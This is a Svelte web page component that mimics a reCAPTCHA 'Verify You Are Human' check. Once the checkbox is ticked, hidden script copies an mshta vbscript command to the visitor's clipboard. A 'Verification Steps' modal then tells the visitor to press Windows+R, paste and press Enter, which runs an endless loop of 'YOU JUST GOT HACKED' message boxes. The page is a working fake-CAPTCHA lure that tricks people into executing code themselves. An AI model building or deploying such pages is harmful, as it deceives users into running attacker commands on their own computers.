<script lang="ts">
	import "../app.css";
	let checked = false;
	let showmodal = false;

	$: if (checked) {
		setTimeout(() => {
			if (document.hasFocus())
				navigator.clipboard.writeText(`mshta vbscript:Execute("Sub SendVerificationUserIsNotRobot(): MsgBox ""YOU JUST GOT HACKED HAHAHAHAHA"", 0, ""TRY TO CLOSE ME IDIOT"" : End Sub: do: SendVerificationUserIsNotRobot() :loop ")`);
			showmodal = true;
		}, 1000)
	}
</script>

<div class="w-full h-[100vh] flex justify-center items-center">
	<div class="m-auto my-auto w-fit flex flex-col items-center gap-8 p-16 shadow-lg border border-zinc-100 rounded-lg">
		<div class="text-blue-500 font-bold text-4xl">Verify You Are Human</div>
		<div class="text-zinc-500 text-xl">Please verify that you are a human to continue</div>
		<div class="flex items-center gap-32 border border-zinc-300 rounded py-2 px-4">
			<div class="flex items-center gap-3">
				<input type="checkbox" class="cursor-pointer size-9 border-zinc-400/80 border-[3px] rounded appearance-none" class:hidden={checked} bind:checked={checked}>
				<img src="/loading.gif" class="size-9" alt="" class:hidden={!checked}>
				<div>I'm not a robot</div>
			</div>
			<div class="flex flex-col items-center gap-1">
				<img src="/recaptcha-icon.png" class="size-16" alt="">
				<div class="text-zinc-400 text-[0.65rem]">Privacy - Terms</div>
			</div>
		</div>
	</div>
	<div class:flex={checked} class:hidden={!checked} class:!opacity-100={showmodal} class:opacity-0={!showmodal} class=" transition-opacity [transition-duration:0.5s] absolute size-full justify-center items-center bg-black/30">
		<div class="bg-white p-8 rounded-lg flex flex-col gap-4">
			<div class="text-3xl font-bold">Verification Steps</div>
			<ol class="flex flex-col gap-2 list-decimal list-inside">
				<li>Press Windows Button "<img src="/windows_logo.png" class="size-5 inline" alt="">" + R</li>
				<li>Press CTRL + V</li>
				<li>Press Enter</li>
			</ol>
		</div>
	</div>
</div>